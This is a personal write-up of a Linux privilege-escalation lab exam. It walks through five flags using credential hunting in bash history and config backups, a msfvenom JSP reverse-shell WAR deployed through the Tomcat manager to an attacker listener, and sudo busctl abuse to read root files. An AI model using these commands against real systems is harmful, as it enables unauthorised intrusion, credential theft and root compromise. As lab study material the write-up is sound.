# Exam

## Flag 1
The "Hint" stated a torough enumeration of the file system as the current user..
I tried:
```
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```
And found the flag.

## Flag 2

The "Hint" states that users are a weak link.
I checked the cmd line history using:
```
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```
There I found following file I could read: `/home/barry/.bash_history`.
This history contained the credential: `i_l0ve_s3cur1ty!`. Next I logged in via ssh with the `barry` as username and found the flag in the users home directory.

## Flag 3

First as the user barry let's search for a file with contains `flag3` using:
```
find / -type f -name "*flag3*" -exec ls -l {} \; 2>/dev/null
```
Sure enough we find following the flag located here: 
```
-rw-r----- 1 root adm 23 Sep  5  2020 /var/log/flag3.txt
```
We cannot read it as we are in the `adm` group.

## Flag 4
First we look for flag4 on the file system:
```
find / -type f -name "*flag4*" -exec ls -l {} \; 2>/dev/null
```
It can be found here:
```
-rw------- 1 tomcat tomcat 25 Sep  5  2020 /var/lib/tomcat9/flag4.txt
```
In order to read we need to become the `tomcat` user.

Using the following command we found a service running as the tomcat user:
```
tomcat       910  0.6  8.4 3084112 172448 ?      Ssl  17:54   0:21 /usr/lib/jvm/default-java/bin/java -Djava.util.logging.config.file=/var/lib/tomcat9/conf/logging.properties
```
Let's check out the configuration of the server:
```
cd /var/lib/tomcat9/conf
ls -l
```
We see that as the `barry` user we are able to read the backup the `tomcat-users.xml.bak`:
```
total 216
drwxrwxr-x 3 root tomcat   4096 Sep  3  2020 Catalina
-rw-r----- 1 root tomcat   7262 Feb  5  2020 catalina.properties
-rw-r----- 1 root tomcat   1400 Feb  5  2020 context.xml
-rw-r----- 1 root tomcat   1149 Feb  5  2020 jaspic-providers.xml
-rw-r----- 1 root tomcat   2799 Feb 24  2020 logging.properties
drwxr-xr-x 2 root tomcat   4096 Sep  3  2020 policy.d
-rw-r----- 1 root tomcat   7586 Feb 24  2020 server.xml
-rw-r----- 1 root tomcat   2232 Sep  5  2020 tomcat-users.xml
-rwxr-xr-x 1 root barry    2232 Sep  5  2020 tomcat-users.xml.bak
-rw-r----- 1 root tomcat 172362 Feb  5  2020 web.xml
```

In this file we find following credentials:
```
 <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
```
When we visit the tomcat manager ui at `http://10.129.24.174:8080/manager/html` we can successfully log in with these credentials.

Let's create a payload to trigger a reverse shell:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.79 LPORT=4443 -f war > backup.war
```
Now we upload the war file using the UI, next we setup the listener:
```
nc -nlvp 4443
```
We then trigger the "backup" war via the UI and sure enough we get a reverse shell.
The flag is in the directory we land in...

## Flag 5

First we look for the flag as the `tomcat` user:
```
```
find / -type f -name "*flag5*" -exec ls -l {} \; 2>/dev/null
```
We find nothing but we suspect the flag5 is in the root folder we cannot access as the `tomcat` user.

As the tomcat user we issue the `sudo -l` command and find the following:
```
Matching Defaults entries for tomcat on nix03:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on nix03:
    (root) NOPASSWD: /usr/bin/busctl
```

We are able to run the `busctl` command as root without providing a password.
GTFOBins provided us with ways to use this bin to escalate privileges: https://gtfobins.org/gtfobins/busctl/#inherit

I wasn't able to get the shell to work (most likely due to the rev shell quircks) but I just guessed the name of the flag and wrote it to a folder I control:
```
sudo busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='cat /root/flag5.txt > /home/barry/koen.txt'
```